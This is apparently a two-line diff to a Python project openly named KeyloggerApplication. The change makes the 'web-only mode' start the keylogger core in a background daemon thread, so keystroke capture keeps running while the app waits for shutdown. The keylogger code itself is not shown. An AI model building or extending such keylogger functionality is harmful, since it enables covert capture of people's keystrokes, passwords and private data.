@@ -109,6 +109,8 @@ class KeyloggerApplication:
                     self._start_interactive_mode()
             else:
                 logger.info("Running in web-only mode")
+                keylogger_thread = threading.Thread(target=self.keylogger_core.run, daemon=True)
+                keylogger_thread.start()
                 self._wait_for_shutdown()
             
         except KeyboardInterrupt:
